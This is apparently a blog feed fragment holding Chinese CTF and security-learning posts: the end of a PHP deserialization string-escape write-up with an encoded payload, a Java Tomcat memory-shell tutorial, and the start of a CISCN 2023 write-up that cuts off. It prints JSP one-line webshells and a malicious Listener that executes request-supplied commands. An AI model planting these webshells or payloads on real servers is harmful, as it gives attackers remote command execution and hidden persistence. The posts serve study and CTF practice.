class="string">&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>(逃逸了14个字符)</p><p>这里解释一下</p><p><img src="../images/image-20230724190419607.png" alt="image-20230724190419607"></p><p><strong>刚好是14个  其实也可以不是14个  这要看你自己的构造了</strong></p><p>先使用常规的方法生成一下实例化的内容·</p><p><img src="../images/image-20230724190736840.png" alt="image-20230724190736840"></p><p><code>aa</code>是我们<code>root</code>传入的位置  <code>bb</code>是我们<code>pwd</code>传入的位置  </p><p><img src="../images/image-20230724190920747.png" alt="image-20230724190920747"></p><p>这是<strong>payload</strong>   这里一共传入了<strong>82个b</strong>字符   经过这个反序列化的时候 <strong>a函数</strong>的替换</p><p><img src="../images/image-20230724191030189.png" alt="image-20230724191030189"></p><p>会变成42个字符a   于是给我们提供了42位的逃逸空间</p><p>于是我们就可以查看</p><p><img src="../images/image-20230724191238844.png" alt="image-20230724191238844"></p><p><img src="../images/image-20230724191508816.png" alt="image-20230724191508816"></p><p>然后就是<code>13+29==42</code>就会成功逃逸成功  后面跟着<code>pull_it</code>这个序列化后的恶意类</p><p>因为逃逸的关系  (<strong>原本的<code>pwd</code>参数也变成了<code>root</code>的值，然后又添加进来一个<code>datou</code>，刚好满足两个参数的要求</strong>)</p><p>于是就成功逃逸出来了(<strong>后面多出来的一些字符并不影响 并且直接添加一个序列化后的类也是可以反序列化的</strong> )</p><p><img src="../images/image-20230724191908997.png" alt="image-20230724191908997"></p><p><strong>本地测试过了</strong>  </p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>重新温习了字符串逃逸这个知识点</strong></li><li><strong>学到了这个在一个序列化后的字符串后面继续添加一个别的类的序列化字符串也是可以一起进行反序列化</strong></li></ul><p><strong>测试过程的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$system</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span>,<span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;system = <span class="variable">$s</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;command = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(calc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($t);</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;</span></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;bb&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($u);</span></span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;aa&quot;;s:8:&quot;password&quot;;s:2:&quot;bb&quot;;O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;user&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;aa&quot;;s:8:&quot;password&quot;;s:2:&quot;bb&quot;;O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;&quot;&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BabyURL&quot;&gt;&lt;a href=&quot;#BabyURL&quot; class=&quot;headerlink&quot; title=&quot;BabyURL&quot;&gt;&lt;/a&gt;BabyURL&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;审计代码得出一个思路&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;就是在反序列化的时候会将得到的</summary>
      
    
    
    
    
    <category term="巅峰极客2023-Web" scheme="https://ke1nys.github.io/tags/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023-Web/"/>
    
  </entry>
  
  <entry>
    <title>java-内存马</title>
    <link href="https://ke1nys.github.io/posts/333d5c9f.html"/>
    <id>https://ke1nys.github.io/posts/333d5c9f.html</id>
    <published>2023-07-20T07:45:30.000Z</published>
    <updated>2023-07-20T10:06:18.493Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1355">参考文章</a>     <a href="https://github.com/Claradoll/Security_Learning">题目用到的代码地址</a></p><p><strong>内存马的分类</strong></p><p><img src="../images/image-20230720170329358.png" alt="image-20230720170329358"></p><p><strong>就是大致分为这四种   下面会依次讲到</strong></p><p><strong>这里的话先了解一下  <code>JSP</code>  是什么</strong></p><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><h3 id="JSP简介"><a href="#JSP简介" class="headerlink" title="JSP简介"></a>JSP简介</h3><p><strong>这里主要了解一下  <code>JSP</code>  的语法</strong>    </p><p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p><p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p><p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p><h3 id="JSP语法"><a href="#JSP语法" class="headerlink" title="JSP语法"></a>JSP语法</h3><h4 id="脚本程序"><a href="#脚本程序" class="headerlink" title="脚本程序"></a>脚本程序</h4><p>脚本程序可以包含任意量的<strong>Java语句、变量、方法或表达式</strong>，只要它们在脚本语言中是有效的。脚本程序的格式如下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% 代码片段 %&gt;</span><br></pre></td></tr></table></figure><p>其等价与下面的XML语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:scriptlet</span>&gt;</span></span><br><span class="line">   代码片段</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用实例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;% out.println(<span class="string">&quot;success&quot;</span>);%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720162202992.png" alt="image-20230720162202992"></p><h4 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h4><p>一个声明语句可以声明<strong>一个或多个变量、方法</strong>，供后面的Java代码使用。JSP声明语句格式如下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! 声明  %&gt;</span><br></pre></td></tr></table></figure><p>等同于下面的XML语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:declaration</span>&gt;</span></span><br><span class="line">   代码片段</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:declaration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用示例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;%! <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&lt;% out.println(<span class="string">&quot;s&quot;</span>);%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720162541860.png" alt="image-20230720162541860"></p><h4 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式"></a>JSP表达式</h4><p>如果JSP表达式中为一个对象，则会自动调用其<code>toString()</code>方法。格式如下，注意表达式后没有<code>;</code></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 表达式  %&gt;</span><br></pre></td></tr></table></figure><p>等价于下面的XML表达式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:expression</span>&gt;</span></span><br><span class="line">   表达式</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:expression</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用示例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!!!&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;% <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Feng&quot;</span>; %&gt;</span><br><span class="line">username:&lt;%=name%&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720163023029.png" alt="image-20230720163023029"></p><h4 id="JSP指令"><a href="#JSP指令" class="headerlink" title="JSP指令"></a>JSP指令</h4><p>JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令</p><div class="table-container"><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>&lt;%@ page … %&gt;</td><td>定义页面的依赖属性，比如脚本语言、error页面、缓存需求等等</td></tr><tr><td>&lt;%@ include … %&gt;</td><td>包含其他文件</td></tr><tr><td>&lt;%@ taglib … %&gt;</td><td>引入标签库的定义，可以是自定义标签</td></tr></tbody></table></div><p>比如我们能通过page指令来设置jsp页面的编码格式</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br></pre></td></tr></table></figure><p>使用示例</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!!!&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    &lt;% <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;林&quot;</span>; %&gt;</span><br><span class="line">    用户名：&lt;%=name%&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720163914388.png" alt="image-20230720163914388"></p><h4 id="JSP注释"><a href="#JSP注释" class="headerlink" title="JSP注释"></a>JSP注释</h4><p>格式</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%-- 注释内容 --%&gt;</span><br></pre></td></tr></table></figure><h3 id="JSP内置对象"><a href="#JSP内置对象" class="headerlink" title="JSP内置对象"></a>JSP内置对象</h3><p>JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下</p><ul><li>由 JSP 规范提供，不用编写者实例化</li><li>通过 Web 容器实现和管理</li><li>所有 JSP 页面均可使用</li><li>只有在脚本元素的表达式或代码段中才能使用</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">对象</th><th style="text-align:left">类型</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">request</td><td style="text-align:left">javax.servlet.http.HttpServletRequest</td><td style="text-align:left">获取用户请求信息</td></tr><tr><td style="text-align:left">response</td><td style="text-align:left">javax.servlet.http.HttpServletResponse</td><td style="text-align:left">响应客户端请求，并将处理信息返回到客户端</td></tr><tr><td style="text-align:left">response</td><td style="text-align:left">javax.servlet.jsp.JspWriter</td><td style="text-align:left">输出内容到 HTML 中</td></tr><tr><td style="text-align:left">session</td><td style="text-align:left">javax.servlet.http.HttpSession</td><td style="text-align:left">用来保存用户信息</td></tr><tr><td style="text-align:left">application</td><td style="text-align:left">javax.servlet.ServletContext</td><td style="text-align:left">所有用户共享信息</td></tr><tr><td style="text-align:left">config</td><td style="text-align:left">javax.servlet.ServletConfig</td><td style="text-align:left">这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数</td></tr><tr><td style="text-align:left">pageContext</td><td style="text-align:left">javax.servlet.jsp.PageContext</td><td style="text-align:left">JSP 的页面容器，用于访问 page、request、application 和 session 的属性</td></tr><tr><td style="text-align:left">page</td><td style="text-align:left">javax.servlet.jsp.HttpJspPage</td><td style="text-align:left">类似于 Java 类的 this 关键字，表示当前 JSP 页面</td></tr><tr><td style="text-align:left">exception</td><td style="text-align:left">java.lang.Throwable</td><td style="text-align:left">该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象</td></tr></tbody></table></div><h2 id="Java木马"><a href="#Java木马" class="headerlink" title="Java木马"></a>Java木马</h2><p>我们</p><p>先来看看传统的JSP木马是如何实现的</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure><p>上面是最简单的一句话木马，没有回显，适合用来反弹shell。下面是一个带回显的JSP木马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"> </span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">        printWriter.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230720165934722.png" alt="image-20230720165934722"></p><p><strong>这就是上面代码的含义</strong></p><p>传统的JSP木马特征性强，且需要文件落地，容易被查杀。因此现在出现了内存马技术。Java内存马又称”无文件马”，相较于传统的JSP木马，其最大的特点就是**无文件落地，存在于内存之中，隐蔽性强。</p><h2 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h2><p>这里的话就不跟着上面的文章写了 </p><p>直接看总结就行了</p><p><strong>直接用一张图来展示这三者的关系</strong></p><p><img src="../images/image-20230720171447069.png" alt="image-20230720171447069"></p><p>这三者是我们在学习内存马的时候会经常遇到的</p><p><code>ServletContext</code>接口的实现类为<code>ApplicationContext</code>类和<code>ApplicationContextFacade</code>类，其中<code>ApplicationContextFacade</code>是对<code>ApplicationContext</code>类的包装。我们对<code>Context</code>容器中各种资源进行操作时，最终调用的还是<code>StandardContext</code>中的方法，因此<code>StandardContext</code>是<code>Tomcat</code>中负责与底层交互的<code>Context</code>。</p><h2 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h2><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。可能有些朋友会发现，这不正是Java Web核心的三大组件嘛！没错，Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p><p>而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。为了便于调试Tomcat，我们先在父项目的pom文件中引入Tomcat依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.55<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的使用的文件直接就是文章开头的<code>github</code>地址用的   下载下来导入就行了</p><h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>根据以上思路，我们的目标就是在服务器中动态注册一个恶意的Listener。而Listener根据事件源的不同，大致可以分为如下三种</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><p>很明显，ServletRequestListener是最适合用来作为内存马的。因为ServletRequestListener是用来监听ServletRequest对象的，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。下面我们来实现一个恶意的Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">            n.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>这里的话模拟动态注册进去的<code>Listener</code>内存马</strong>      (<strong>等会我们分析完这个流程就会重新动态的导入一个内存马，并把上面的这个代码给注释掉</strong>)</p><p><img src="../images/image-20230720172131744.png" alt="image-20230720172131744"></p><p>​    </p><p>给这里下个断点  然后<code>debug</code>一下 得到他的利用栈</p><p><img src="../images/image-20230720172237569.png" alt="image-20230720172237569"></p><p>分析这个利用栈</p><p><code>StandardContext#fireRequestInitEvent</code>调用了我们的<code>Listener</code>，我们跟进看其实现</p><p><img src="../images/image-20230720172338598.png" alt="image-20230720172338598"></p><p>关键代码有两处，首先通过<code>getApplicationEventListeners()</code>获取一个Listener数组，然后遍历数组调用<code>listener.requestInitialized(event)</code>方法触发Listener。跟进<code>getApplicationEventListeners()</code>方法</p><p>这里的获取这个<code>Listener</code>就是关键了  因为就是我们就是恶意构造一个<code>Listener</code>传进去 然后让其获取加载(<strong>不出意外的话继续找下去能找到添加<code>Listener</code>的地方</strong>)</p><p><img src="../images/image-20230720173457320.png" alt="image-20230720173457320"></p><p>可以看到Listener实际上是存储在<em><code>applicationEventListenersList</code></em>属性中的</p><p><img src="../images/image-20230720173533994.png" alt="image-20230720173533994"></p><p>并且我们可以通过<code>StandardContext#addApplicationEventListener()</code>方法来添加<code>Listener</code></p><p><img src="../images/image-20230720173728831.png" alt="image-20230720173728831"></p><p>看到这里的话就和我们刚开始添加的这个<code>Listener</code>联系到一起了</p><p><img src="../images/image-20230720173826866.png" alt="image-20230720173826866"></p><p>实际情况中是没有它的  现在我们分析利用链  分析到了这个添加<code>listener</code>的地方</p><p>所以我们就得想办法构造恶意的<code>listener</code>来添加进去了</p><h4 id="获取StandardContext类"><a href="#获取StandardContext类" class="headerlink" title="获取StandardContext类"></a>获取StandardContext类</h4><p>下面的工作就是获取<code>StandardContext</code>类了，在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类</p><p><img src="../images/image-20230720174343442.png" alt="image-20230720174343442"></p><p>同样地，由于<code>JSP</code>内置了<code>request</code>对象，我们也可以使用同样的方式来获取</p><p><strong>(一共内置了9个对象   <code>request</code>是其中一个)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://goodapple.top/archives/1355&quot;&gt;参考文章&lt;/a&gt;     &lt;a href=&quot;https://github.com/Claradoll/Security_Learning&quot;&gt;题目用到的代码地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="java-内存马" scheme="https://ke1nys.github.io/tags/java-%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Nss-Ciscn2023</title>
    <link href="https://ke1nys.github.io/posts/b7182eee.html"/>
    <id>https://ke1nys.github.io/posts/b7182eee.html</id>
    <published>2023-07-19T11:44:28.000Z</published>
    <updated>2023-07-19T13:08:28.863Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN-2023-华北-ez-date"><a href="#CISCN-2023-华北-ez-date" class="headerlink" title="[CISCN 2023 华北]ez_date"></a>[CISCN 2023 华北]ez_date</h2><p><strong>题目给的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span 